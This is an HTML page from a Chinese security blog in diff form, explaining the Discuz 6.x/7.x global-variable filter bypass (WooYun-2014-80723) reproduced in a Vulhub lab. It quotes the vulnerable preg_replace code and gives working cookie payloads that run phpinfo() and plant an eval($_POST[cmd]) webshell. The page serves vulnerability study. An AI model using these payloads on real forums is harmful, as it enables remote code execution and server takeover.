@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用 | CherryGk&#39;s Blog | If you have any questions, please contact QQ1196821466 or leave message in the upper right.</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="命令执行,漏洞利用">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":true,"app_id":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","app_key":"twfcGffxeJ6Bfm4fpJUQ256M","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","appkey":"twfcGffxeJ6Bfm4fpJUQ256M","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":"c1ada43c"}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.2"></script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname"></h5>
+          <a href="mailto:1196821466@qq.com" title="1196821466@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>8</span>
+            
+              <span>2</span>
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>6</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                文章分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章总览
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-plus-square"></i>
+                友链
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-10-18T08:32:21.000Z" itemprop="datePublished" class="page-time">
+  2018-10-18
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/WooYun/">WooYun</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-dzeval"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-10-18 16:32:21" datetime="2018-10-18T08:32:21.000Z"  itemprop="datePublished">2018-10-18</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/WooYun/">WooYun</a></li></ul>
+
+
+
+            
+	<span id="/2018/10/18/dzeval/" class="leancloud_visitors" data-flag-title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2018/10/18/dzeval/#comment">
+            <span class="valine-comment-count" data-xid="/2018/10/18/dzeval/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里采用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub漏洞靶场</a>直接一键搭建</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先先讲一下php中<code>register_globals</code>的功能：<a href="http://php.net/manual/zh/security.globals.php" target="_blank" rel="noopener">官方文档</a>：<br>大概意思就是使用$_GET、$_POST这类提交参数的方法，当<code>register_globals</code>的值为<code>on</code>，<br>提交的参数会直接被注册为全局变量，所以为了安全，php在PHP 4.2.0 起就将默认值改为<code>off</code>了<br>（以上对这个漏洞都没有什么用，看文章看到了，就当写笔记了）</p>
+<p>先看看当GPC为<code>off</code>时，dz有一个将$_request中的特殊字符做了转义的函数，<br>跟GPC为<code>on</code>的作用差不多，代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include/global.func.php代码里：</span><br><span class="line"></span><br><span class="line">function daddslashes($string, $force = 0) &#123;</span><br><span class="line">    !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());</span><br><span class="line">    if(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">        if(is_array($string)) &#123;</span><br><span class="line">            foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">                $string[$key] = daddslashes($val, $force);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $string = addslashes($string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">include/common.inc.php里：</span><br><span class="line"></span><br><span class="line">foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $_key&#123;0&#125; != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;     //主要是这一段进行了过滤</span><br></pre></td></tr></table></figure>
+<p>当然绕过这个过滤很简单:、<br>     直接使用<code>$_GET/$_POST/$_COOKIE</code>这样的变量即可绕过，但是dz里直接使用这些的机会不多，所以需要换一种方法，<br>再来看看其他地方，<br>dz中有一段代码是防止当register_globals为<code>on</code>时，dz自身的$_GLOBALS变量被覆盖的情况，<br>函数代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_REQUEST[&apos;GLOBALS&apos;]) OR isset($_FILES[&apos;GLOBALS&apos;])) &#123;</span><br><span class="line">    exit(&apos;Request tainting attempted.&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以这个时候问题来了，$_REQUEST的这个变量是受到php.ini中<code>request_order</code>的影响的，<br>在<code>php5.3.x</code>中,request_order默认值为<code>GP</code>(get和post),没有C，<br>所以我们可以通过提交C,也就是COOKIE来提交GLOBALS这类的变量了，</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">在include/discuzcode.func.php中</span><br><span class="line"></span><br><span class="line">function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode =1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) &#123;</span><br><span class="line">global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;</span><br><span class="line">if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[/code]&apos;) || strpos($message, &apos;[/CODE]&apos;)) !== FALSE) &#123;</span><br><span class="line">    $message = preg_replace(&quot;/s?[code](.+?)[/code]s?/ies&quot;, &quot;codedisp(&apos;\1&apos;)&quot;, $message);</span><br><span class="line">&#125;</span><br><span class="line">    $msglower = strtolower($message);</span><br><span class="line">//$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;</span><br><span class="line">if(!$htmlon) &#123;</span><br><span class="line">    $message = $jammer ? preg_replace(&quot;/rn|n|r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);</span><br><span class="line">&#125;</span><br><span class="line">if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;]) &amp;&amp; is_array($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;])) &#123;</span><br><span class="line">    if(!$discuzcodes[&apos;smiliesreplaced&apos;]) &#123;</span><br><span class="line">        foreach($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;] AS $key =&gt; $smiley) &#123;</span><br><span class="line">            $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;][$key] = &apos;&lt;img src=&quot;images/smilies/&apos;.$GLOBALS[&apos;_DCACHE&apos;][&apos;smileytypes&apos;][$GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;typearray&apos;][$key]][&apos;directory&apos;].&apos;/&apos;.$smiley.&apos;&quot; smilieid=&quot;&apos;.$key.&apos;&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $discuzcodes[&apos;smiliesreplaced&apos;] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br></pre></td></tr></table></figure></p>
+<p>的preg_replace可以执行命令</p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>随便打开一篇管理员发布的帖子(试了试自己发的帖子貌似不行)，然后抓包将:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PBb_fid2=1539768491;GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>添加进cookie：</p>
+<figure class="image-box">
+                <a rel=Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用 href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15398517251.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15398517251.jpg" alt="" title="" class=""></a>
+                <p></p>
+            </figure>
+<p>可以看到已经成功的执行了phpinfo，一句话的话换成:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[cmd])%3B</span><br></pre></td></tr></table></figure>
+<p>即可拿到shell</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2018-10-18T08:35:31.806Z" itemprop="dateUpdated">2018-10-18 16:35:31</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2018/10/18/dzeval/" target="_blank" rel="external">http://yoursite.com/2018/10/18/dzeval/</a>
+        
+    </div>
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="">
+            
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/10/18/dzeval/&title=《Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/10/18/dzeval/&title=《Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用》 — CherryGk's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/10/18/dzeval/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用》 — CherryGk's Blog&url=http://yoursite.com/2018/10/18/dzeval/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/10/18/dzeval/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2018/10/15/bugku3/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">bugku writeup(分析）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现"><span class="post-toc-number">1.</span> <span class="post-toc-text">漏洞复现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现-1"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞复现</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+</div>
+
+        <footer class="footer">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                 &copy; 2017 - 2018
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/10/18/dzeval/&title=《Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/10/18/dzeval/&title=《Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用》 — CherryGk's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/10/18/dzeval/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用》 — CherryGk's Blog&url=http://yoursite.com/2018/10/18/dzeval/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/10/18/dzeval/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABw0lEQVR42u3ay07DUAwFwP7/TxeJLfTq2E5MkCarKC2XaRaWX69XfL2/r0/38ycXX7i4uGPu+3j9JJ6ffKKcz0wMuLi4+9wkeCXH5T/1/J2Pz3FxcR/GPd9PPsXFxf2/3F4BU30duLi4z+Emxc/50KtaJ5fVari4uAPuvGE6v1/t7+Li4g6mEklAqX5z9N9xcXFXuPmY5JzonJOVvEUShTlcXNybuXkRkmQdebskP/OXEIaLi/sAbm9Akq9ZFM7HxcVd5CbpS7XFmSc6hYCIi4u7zp0PWXtFVGGFCxcXd4VbbYBOSprelGT0Z7i4uANuPhDtLWrMGyW4uLhP4PaaIL1Fq3LyhIuLu8itDk7yUFX9FBcX92+5yRJVb9RaHatE6x24uLgr3Dwd6a1oVLnRi8DFxb2Zmxcn1RZGUjLlLVpcXNx97rWs5rg0D2S4uLgr3MlyVdI8rTZby5NYXFzcS7nVgFItbPJgl6dEuLi4O9xJ8CokKOMBLS4u7j63N1CpNlJHxQ8uLu4judWflIxYkkBW7sTg4uKuc69dsyiPb3FxcRe51eCSJ0BJQVV4Qbi4uCvcXsM0KlSKhVM1VcLFxb2B+wVUISULWLYj6gAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    <script type="text/javascript">
+  daovoice('init', {
+    app_id: "c1ada43c"
+  });
+  daovoice('update');
+</script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false});</script></body>
+</html>
